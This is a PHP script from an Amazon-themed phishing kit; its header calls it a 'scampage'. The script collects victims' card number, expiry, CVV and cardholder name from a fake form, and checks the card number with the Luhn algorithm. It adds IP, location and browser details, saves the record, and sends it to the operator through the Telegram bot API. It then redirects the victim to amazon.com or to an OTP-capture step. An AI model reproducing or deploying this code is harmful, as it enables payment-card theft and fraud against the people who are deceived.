<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);

function is_valid_card_number($number)
{
    $digitsOnly = preg_replace('/\D/', '', (string) $number);
    if ($digitsOnly === '' || strlen($digitsOnly) < 12 || preg_match('/^0+$/', $digitsOnly)) {
        return false;
    }

    $sum = 0;
    $shouldDouble = false;

    for ($i = strlen($digitsOnly) - 1; $i >= 0; $i--) {
        $digit = (int) $digitsOnly[$i];

        if ($shouldDouble) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }

        $sum += $digit;
        $shouldDouble = !$shouldDouble;
    }

    return $sum % 10 === 0;
}

$requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'GET';
if (strtoupper($requestMethod) !== 'POST') {
    return;
}

# Adding Settings
include('function.php');
$settings = include('../config.php');
require_once __DIR__ . '/../storage/storage.php';

# User Agent
$useragent = $_SERVER['HTTP_USER_AGENT'];

$holder = isset($_POST['holder']) ? trim($_POST['holder']) : '';
$ccnumInput = isset($_POST['ccnum']) ? $_POST['ccnum'] : '';
$ccnum = trim($ccnumInput);
$expMonth = isset($_POST['EXP1']) ? (string) $_POST['EXP1'] : '';
$expYear = isset($_POST['EXP2']) ? (string) $_POST['EXP2'] : '';
$ccexp = $expMonth . "/" . $expYear;
$cvv2 = isset($_POST['cvv2']) ? trim($_POST['cvv2']) : '';

if (!is_valid_card_number($ccnumInput)) {
    $_SESSION['card_form_data'] = [
        'holder' => $holder,
        'ccnum' => trim($ccnumInput),
        'EXP1' => $expMonth,
        'EXP2' => $expYear,
        'cvv2' => $cvv2,
    ];

    header('Location: card.php?invalid_data=1');
    exit;
}

# Logs
$message = "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
$message .= "➤ [ Card Name ] : {$holder}\n";
$message .= "➤ [ Card Num ] : {$ccnum}\n";
$message .= "➤ [ Card Exp ] : {$ccexp}\n";
$message .= "➤ [ Card Cvv ] : {$cvv2}\n";
$message .= "--------- MORE INFO -----------\n";
$message .= "➤ [ IP Address ] : {$IP}\n";
$message .= "➤ [ User-Agent ] : {$useragent}\n";
$message .= "➤ [ OS ]         : {$os}\n";
$message .= "➤ [ Browser ]    : {$browser}\n";
$message .= "➤ [ City(IP) ]   : {$city}\n";
$message .= "➤ [ Country ]    : {$countryname}\n";
$message .= "➤ [ Date ]       : {$date}\n";
$message .= ".--------------------------------.\n";

# Persist step data
$payload = [
    'card_name' => $holder,
    'card_number' => $ccnum,
    'expiry' => $ccexp,
    'cvv' => $cvv2
];

append_login_session_step(session_id(), 'card', $payload);

# clear stale form data on success
unset($_SESSION['card_form_data']);

# Send Bot

if (
    $settings['telegram'] == "1"
    && function_exists('curl_init')
    && !empty($settings['bot_url'])
    && !empty($settings['chat_id'])
) {
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
} else {
  // Telegram disabled or misconfigured; skipping cURL request.
}

if (is_afk_enabled()) {
    header('Location: https://www.amazon.com');
} else {
    header('Location: dashboard.php?awaiting_otp=1');
}
exit;
?>